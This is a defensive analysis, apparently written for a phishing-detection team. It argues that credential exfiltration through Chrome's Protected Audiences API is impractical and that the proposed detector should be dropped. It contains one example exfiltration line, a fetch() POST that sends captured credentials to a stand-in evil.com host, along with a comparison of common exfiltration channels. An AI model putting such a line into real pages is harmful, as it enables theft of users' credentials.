# Protected Audiences API: credential exfiltration is a dead vector

**The Protected Audiences API cannot meaningfully be abused for credential exfiltration, and the API itself is being removed from Chrome entirely.** Google announced the retirement of Protected Audiences on October 17, 2025, with deprecation in Chrome 144 and full removal in Chrome 150. Even during its active life, the API's privacy sandboxing made credential theft through ad auction beacons impractical — requiring ~22 discrete steps, 6–8 server components, and minutes-to-hours of latency versus a single line of `fetch()`. The PhishOps detector candidate for Protected Audiences abuse should be eliminated from the backlog immediately. No residual monitoring value exists for an API with **negligible current usage** that is being stripped from the browser.

---

## The API is dead: Google retired Privacy Sandbox in October 2025

The most decisive finding is that Protected Audiences no longer exists as a viable attack surface. Google VP Anthony Chavez published a formal retirement announcement on October 17, 2025, killing Protected Audiences along with Topics, Attribution Reporting, IP Protection, and most other Privacy Sandbox APIs. The November 7, 2025 "Intent to Deprecate and Remove" posting on blink-dev confirmed the API's collapse in hard numbers: **`joinAdInterestGroup()` usage dropped ~100×** and **`runAdAuction()` usage dropped ~10×** following Google's July 2024 decision to keep third-party cookies. "Virtually none" of remaining auctions had winners.

The timeline to removal is concrete. Chrome 144 begins deprecation; Chrome 150 completes removal. Bidding and Auction Services and Trusted Key Value Services shut down by end of 2025 due to "negligible" usage. The WICG/turtledove repository has been archived. No other browser ever implemented Protected Audiences — **Mozilla issued a formal "position: negative"**, Apple/WebKit never engaged, and Edge pursued its own abandoned alternative (PARAKEET/Ad Selection API). The W3C specification remained a Draft Community Group Report throughout its life, explicitly marked "not a W3C Standard nor on the W3C Standards Track."

---

## The theoretical attack path requires 22 steps for what fetch() does in one

Even ignoring the API's death, the credential exfiltration scenario fails on pure engineering economics. A phishing page that has captured credentials via a form has **unrestricted JavaScript execution** — the exact same execution context needed to call `joinAdInterestGroup()`. Any attacker in this position can exfiltrate data with `fetch('https://evil.com/steal', {method:'POST', body:creds})` in a single line that fires in under 100ms with ~99% reliability.

The Protected Audiences path requires this sequence: register an HTTPS domain, enroll with Google's developer attestation program, build and host a `generateBid()` worklet, build and host a `scoreAd()` worklet, build and host a `reportWin()` function, host an ad creative that meets **k-anonymity thresholds (≥50 browsers)**, set up a report collection endpoint, construct an interest group object with stolen data in `userBiddingSignals`, call `joinAdInterestGroup()`, construct an auction configuration, call `runAdAuction()`, wait for the bidding worklet to execute in an isolated environment, wait for scoring, wait for the ad to render in a fenced frame, wait for `reportWin()` to fire `sendReportTo()`, and finally receive the beacon at the collection server. That is **~22 discrete steps, 150–250+ lines of code across client and server, and 6–8 server-side components**.

The reliability estimate is below 5%. The attack fails if Permissions-Policy blocks the API calls, if the k-anonymity threshold isn't met, if the user clears browsing data, if the interest group expires (30-day maximum), if the browser isn't Chrome, if Privacy Sandbox is disabled, or if CSP blocks the attacker's bidding logic URL. **Latency ranges from minutes to hours to never**, depending on whether an auction actually runs and the report fires.

| Method | Lines of code | Server components | Reliability | Latency | Complexity |
|--------|:---:|:---:|:---:|:---:|:---:|
| `fetch()` POST | 1 | 1 | ~99% | <100ms | Trivial |
| `navigator.sendBeacon()` | 1 | 1 | ~99% | <100ms | Trivial |
| `new Image().src` | 1 | 1 | ~95% | <100ms | Trivial |
| WebSocket | 3–5 | 1 | ~95% | <100ms | Low |
| CSS exfiltration | 5–15 | 1 | ~65% | Seconds | Medium |
| **Protected Audiences** | **150–250+** | **6–8** | **<5%** | **Minutes–hours** | **Extreme** |

---

## Privacy sandboxing blocks the data path at multiple chokepoints

The API's privacy architecture creates layered barriers even against the theoretical attack. The most critical restriction: **`userBiddingSignals` — where an attacker would store stolen credentials — is not available in `reportWin()`**. The `generateBid()` worklet can read `userBiddingSignals`, but this worklet runs in a fully isolated JavaScript environment with **no network access, no DOM access, no storage access, and no ability to communicate with the page or external servers**. Data can only exit through constrained return values.

The channels from `generateBid()` to `reportWin()` (where `sendReportTo()` lives) are narrow:

- **Bid value**: ~64-bit float, meaning ~8 bytes per auction. A 30-character credential (240 bits) would require ~4 separate auction wins.
- **`adCost`**: Stochastically rounded to 8-bit mantissa — noisy and unreliable for exact data.
- **`modelingSignals`**: 0–65,535 integer range, but noised before reaching `reportWin()`.
- **Render URL selection**: Subject to k-anonymity (≥50 browsers must share the URL), so variable per-victim data cannot be encoded.
- **Private Aggregation API**: Encrypted, noised with Laplace noise, budget-limited to 65,536 per 10 minutes, and requires a Trusted Execution Environment aggregation service to decrypt. Exfiltrating a single user's credentials through aggregate reports is mathematically impractical — the noise overwhelms any individual signal.

The `sendReportTo()` URL itself can include arbitrary query parameters, but only data available inside `reportWin()` can be encoded. Since `userBiddingSignals` doesn't reach `reportWin()`, the attacker is limited to the narrow channels above. **Even `registerAdBeacon()` cannot help** — the fenced frame rendering the ad has no access to interest group data or `userBiddingSignals`.

---

## Security researchers found 12 FLEDGE attacks — none involve credential theft

The most comprehensive security analysis is Calderonio, Ali, & Polakis's **"Fledging Will Continue Until Privacy Improves"** (USENIX Security 2024, University of Illinois Chicago), which presents 12 novel attacks across four categories: tracking (7 attacks), cross-site leakage (2), service disruption (2), and pollution (1). Every attack targets **privacy violations within the ad ecosystem** — re-identifying users cross-site, inferring browsing history, crashing browsers, or manipulating interest groups. None target credential exfiltration, because the researchers recognized the fundamental paradox: any JavaScript execution context sufficient to invoke the Protected Audiences API already provides trivially simpler exfiltration paths.

Mozilla's March 2024 privacy analysis concluded Protected Audiences "fails to meet its own privacy goals" with "no credible fix for some of the information leaks" — but these leaks concern cross-site tracking, not arbitrary data theft. The Privacy Sandstorm project catalogs multiple additional analyses, all focused on tracking/privacy concerns rather than credential theft. **No security researcher, academic paper, or industry analysis has identified Protected Audiences as a meaningful credential exfiltration vector.**

---

## Decisive recommendation: eliminate this detector candidate entirely

The assessment answers each of the five decision questions unambiguously:

**1. Is credential exfiltration via Protected Audiences practically possible?** No. The `userBiddingSignals` field accepts arbitrary JSON and is readable in `generateBid()`, but the worklet isolation prevents direct network exfiltration. The narrow covert channels from `generateBid()` to `reportWin()` (~8 bytes per auction via bid value) make bulk credential theft impractical, and the API is being removed from Chrome regardless.

**2. How many steps versus a simple fetch POST?** ~22 steps with 6–8 server components versus 1 step with 1 server component. The Protected Audiences path is **150–250× more code**, **~20× less reliable**, and **1,000–100,000× slower**.

**3. Should this detector candidate be eliminated from PhishOps's backlog?** Yes, immediately and completely. Building a detector for an API that is deprecated in Chrome 144, removed in Chrome 150, was never implemented by any other browser, has negligible current usage, and provides no attack advantage over `fetch()` would be a pure waste of engineering effort.

**4. Is there any residual value in monitoring `joinAdInterestGroup` calls on phishing pages?** No. Even as a signal, `joinAdInterestGroup` on a phishing page would indicate an ad-tech operation, not exfiltration — and the API will cease to exist within months. The only conceivable edge case (a phishing page using PA as a CSP bypass) is impossible in practice because PA's own network requests for bidding logic and reports are subject to the same CSP restrictions as `fetch()`.

**5. Priority ranking relative to other CUTTING_EDGE_DETECTORS?** This candidate should be ranked **last — below all other candidates** — and removed from the list entirely. Every engineering hour spent on a Protected Audiences detector is an hour not spent on detectors for active, high-volume exfiltration channels (`fetch`, `sendBeacon`, image pixel beacons, WebSocket, form action hijacking) that phishing pages actually use millions of times daily. The attack is strictly more complex, strictly less effective, strictly less reliable, and targets an API that is being deleted from the only browser that ever supported it.